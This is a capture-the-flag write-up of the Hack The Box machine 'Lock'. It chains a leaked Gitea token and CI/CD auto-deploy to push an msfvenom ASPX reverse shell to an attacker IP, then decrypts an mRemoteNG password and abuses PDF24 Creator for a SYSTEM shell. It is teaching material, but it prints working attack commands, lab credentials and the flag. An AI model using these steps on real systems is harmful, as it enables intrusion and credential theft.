# Lock

**Lock** is a Windows-based Hack The Box machine involving web and SMB enumeration, Gitea repository access, exposed Git credentials, CI/CD abuse, credential discovery through an mRemoteNG configuration file, RDP access, and privilege escalation through PDF24 Creator.

**Target IP:** `10.129.234.64`

---

## Overview

The initial scan revealed four accessible services:

* HTTP on port `80`
* SMB on port `445`
* Gitea on port `3000`
* RDP on port `3389`

The most interesting service was the Gitea instance running on port `3000`. Enumeration of the available repositories and their commit history exposed a personal access token.

The token allowed access to additional repositories. The `website` repository revealed that changes were automatically deployed to the web server through CI/CD. This deployment mechanism was leveraged to execute an ASPX reverse shell and obtain access as `LOCK\ellen.freeman`.

Further enumeration uncovered an encrypted mRemoteNG configuration file containing credentials for `Gale.Dekarios`. The credentials were decrypted and used to obtain RDP access.

Finally, the installed PDF24 Creator version was identified as `11.15.1`. A symbolic-link/OpLock-based privilege escalation technique was used to obtain a SYSTEM shell and access the root flag.

---

# Enumeration

## Nmap Scan

An initial all-port scan identified four open TCP ports:

```text
80/tcp   open  http
445/tcp  open  microsoft-ds
3000/tcp open  ppp
3389/tcp open  ms-wbt-server
```

Service and version detection provided more information:

```text
80/tcp   open  http          Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds
3000/tcp open  http          Golang net/http server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

The HTTP service on port `80` had the title:

```text
Lock - Index
```

Port `3000` hosted:

```text
Gitea: Git with a cup of tea
```

RDP enumeration identified the machine as:

```text
Target_Name: LOCK
NetBIOS_Domain_Name: LOCK
NetBIOS_Computer_Name: LOCK
DNS_Domain_Name: Lock
DNS_Computer_Name: Lock
Product_Version: 10.0.20348
```

SMB signing was enabled but not required:

```text
Message signing enabled but not required
```

### Discovered Services

| Port | Service | Information                 |
| ---- | ------- | --------------------------- |
| 80   | HTTP    | Microsoft IIS 10.0          |
| 445  | SMB     | Microsoft-DS                |
| 3000 | HTTP    | Gitea                       |
| 3389 | RDP     | Microsoft Terminal Services |

---

# Web Enumeration

Initial enumeration of SMB using tools such as `enum4linux` and `smbclient` did not reveal anything immediately useful.

The website on port `80` also did not provide a significant initial foothold.

The Gitea instance on port `3000` therefore became the primary focus.

---

# Initial Foothold

## Gitea Enumeration

The Gitea instance was identified as hosting development repositories belonging to:

```text
ellen.freeman
```

Repository and commit history enumeration revealed a personal access token:

```text
PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
```

The repository was cloned:

```bash
git clone http://10.129.234.64:3000/ellen.freeman/dev-scripts.git
```

The Gitea access token was then exported:

```bash
export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f
```

A repository enumeration script was used:

```bash
python3 repos.py http://10.129.234.64:3000
```

The available repositories were:

```text
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```

This revealed another repository:

```text
ellen.freeman/website
```

---

## Website Repository

The `website` repository was cloned using the discovered token:

```bash
git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
```

The repository contained a README stating:

```text
CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```

This was an important finding.

**Repository changes were automatically deployed to the target web server.**

---

## Confirming CI/CD Deployment

A test HTML file was created:

```bash
echo "<h1>Hello</h1>" > test.html
```

It was added to Git:

```bash
git add test.html
```

Git identity was configured:

```bash
git config --global user.name "ellen.freeman"
git config --global user.email "ellen.freeman"
```

The change was committed:

```bash
git commit -m "test"
```

The commit was pushed:

```bash
git push
```

The deployed file was then requested from the web server:

```bash
curl http://10.129.234.64/test.html
```

The response confirmed that the repository changes were deployed:

```html
<h1>Hello</h1>
```

This confirmed control over content deployed to the IIS web server.

---

## Deploying an ASPX Reverse Shell

A Windows Meterpreter reverse shell payload was generated:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.95 LPORT=4444 -f aspx > rev.aspx
```

The generated payload was then added to the repository:

```bash
git add rev.aspx
git commit -m "reverse shell"
git push
```

The commit was successfully pushed to the Gitea server:

```text
To http://10.129.234.64:3000/ellen.freeman/website.git
   a8cb287..696c484  main -> main
```

A Metasploit handler was started to receive the connection:

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.15.95; set LPORT 4444; run"
```

The deployed ASPX payload was then used to obtain a Meterpreter session.

---

# User Access

## Ellen Freeman

The Meterpreter session was confirmed with:

```text
getuid
```

The result was:

```text
Server username: LOCK\ellen.freeman
```

**Initial Windows access was obtained as `LOCK\ellen.freeman`.**

---

## Credential Discovery

Further enumeration of the user's files revealed an mRemoteNG configuration file:

```text
C:\Users\ellen.freeman\Documents\config.xml
```

The file contained an encrypted connection entry:

```xml
<Node Name="RDP/Gale" Type="Connection"
Username="Gale.Dekarios"
Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" />
```

The configuration was identified as an **mRemoteNG** configuration.

A publicly available mRemoteNG password-decryption script was used:

```text
https://raw.githubusercontent.com/gquere/mRemoteNG_password_decrypt/refs/heads/master/mremoteng_decrypt.py
```

The configuration was processed with:

```bash
python3 mremote.py config.xml
```

The decrypted credentials were:

```text
Name: RDP/Gale
Hostname: Lock
Username: Gale.Dekarios
Password: ty8wnW9qCKDosXo6
```

### Recovered Credentials

| Username        | Password           | Access |
| --------------- | ------------------ | ------ |
| `Gale.Dekarios` | `ty8wnW9qCKDosXo6` | RDP    |

---

## RDP Access

Port `3389` was identified during the initial enumeration, so the recovered credentials were used to connect through RDP:

```bash
xfreerdp3 /v:10.129.234.64 /u:Gale.Dekarios /p:'ty8wnW9qCKDosXo6'
```

This provided access to the Windows desktop as:

```text
Gale.Dekarios
```

---

# Privilege Escalation

## PDF24 Creator

After obtaining RDP access, the installed software was investigated.

A privilege-escalation vector involving **PDF24 Creator** was identified.

The installed version was:

```text
11.15.1
```

The required symbolic-link testing tools were obtained from:

```text
https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z
```

The archive contained tools including:

```text
BaitAndSwitch.exe
CreateDosDeviceSymlink.exe
CreateHardlink.exe
CreateMountPoint.exe
CreateNativeSymlink.exe
CreateNtfsSymlink.exe
CreateObjectDirectory.exe
CreateRegSymlink.exe
CreateSymlink.exe
DeleteMountPoint.exe
DumpReparsePoint.exe
SetOpLock.exe
```

The relevant tool used was:

```text
SetOpLock.exe
```

---

## Transferring SetOpLock

The executable was downloaded onto the target using PowerShell:

```powershell
curl http://10.10.15.95:8000/SetOpLock.exe -o SetOpLock.exe
```

The tool was then executed on the target.

---

## Abusing PDF24

A new command shell was opened using `SetOpLock.exe`, followed by execution of:

```cmd
msiexec.exe /fa c:\_install\pdf24-creator-11.15.1-x64.msi
```

The resulting process interaction provided access to the required Windows interface.

The sequence documented in the notes was:

1. Execute `SetOpLock.exe`.
2. Open a new command shell.
3. Execute the PDF24 MSI repair operation.
4. Select the relevant properties interface.
5. Enable **Legacy Mode**.
6. Select Firefox as the browser.
7. Use `CTRL + O`.
8. Open `cmd.exe`.

This resulted in a command prompt running with **SYSTEM privileges**.

---

# Root Access

The privilege escalation was successful and resulted in SYSTEM-level access.

The root flag was located at:

```text
C:\Users\Administrator\Desktop\root.txt
```

The supplied root flag was:

```text
c6b5bdc14a3ce74b8e54b240cf4d1d22
```

**SYSTEM access was successfully obtained.**

---

# Attack Path Summary

```text
Initial Enumeration
        |
        v
HTTP / SMB / Gitea / RDP
        |
        v
Gitea Enumeration
        |
        v
Commit History
        |
        v
Personal Access Token
        |
        v
Access to ellen.freeman repositories
        |
        v
Website Repository
        |
        v
CI/CD Auto Deployment
        |
        v
Push ASPX Payload
        |
        v
Meterpreter Reverse Shell
        |
        v
LOCK\ellen.freeman
        |
        v
mRemoteNG config.xml
        |
        v
Decrypt Stored Credentials
        |
        v
Gale.Dekarios Credentials
        |
        v
RDP Access
        |
        v
PDF24 Creator 11.15.1
        |
        v
SetOpLock / Symbolic-Link Technique
        |
        v
SYSTEM Shell
        |
        v
root.txt
```

---

# Key Takeaways

* Git repositories should be thoroughly investigated, including **commit history**, not just the current files.
* Personal access tokens should never be exposed in source code or repository history.
* CI/CD pipelines that automatically deploy repository changes require strict access controls.
* A repository with deployment privileges can become a direct path to server-side code execution if the deployment process is not securely isolated.
* Configuration files from remote-management applications can contain sensitive credentials.
* Encrypted credentials should still be treated as sensitive data because weak or recoverable encryption mechanisms may allow them to be decrypted.
* RDP should be protected with strong authentication and appropriate access controls.
* Installed third-party software should be included in Windows privilege-escalation enumeration.
* Vulnerable software versions combined with local user access can provide a path to SYSTEM.

---

# Tools Used

* Nmap
* enum4linux
* smbclient
* Gitea
* Git
* Python
* Metasploit
* msfvenom
* Meterpreter
* mRemoteNG password-decryption script
* xfreerdp3
* PowerShell
* SetOpLock
* Symbolic Link Testing Tools
* msiexec

---

# Conclusion

**Lock** demonstrated how multiple security weaknesses can be chained together to compromise a Windows host.

The attack began with enumeration of the exposed services and identification of the Gitea instance. Examination of repository history revealed a personal access token, which provided access to additional repositories.

The `website` repository disclosed an automated CI/CD deployment mechanism. Because repository changes were automatically deployed to the IIS server, an ASPX reverse-shell payload could be committed and deployed, resulting in access as `ellen.freeman`.

Further enumeration uncovered an mRemoteNG configuration file containing encrypted credentials. After decrypting the stored password, RDP access was obtained as `Gale.Dekarios`.

The final escalation involved the installed PDF24 Creator version `11.15.1` and the use of `SetOpLock.exe` from the symbolic-link testing tools. This ultimately resulted in a SYSTEM shell and access to the root flag.

The machine highlights the importance of securing **source-code repositories, secrets, CI/CD pipelines, remote-management configurations, third-party software, and local privilege boundaries**.
